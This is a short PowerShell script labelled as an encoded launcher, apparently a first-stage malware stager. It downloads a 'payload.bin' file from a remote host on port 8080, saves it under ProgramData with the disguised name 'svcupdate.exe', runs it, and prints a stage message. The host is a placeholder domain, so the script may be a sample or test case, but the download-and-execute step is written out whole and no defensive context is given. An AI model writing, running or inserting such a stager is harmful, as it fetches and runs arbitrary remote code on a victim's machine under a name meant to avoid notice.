# Encoded launcher
$Stage1Url = "http://contoso.com:8080/downloads/payload.bin"
$PayloadPath = 'C:\ProgramData\svcupdate.exe'
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $PayloadPath)
& $PayloadPath
Write-Output "stage 27 initialized"
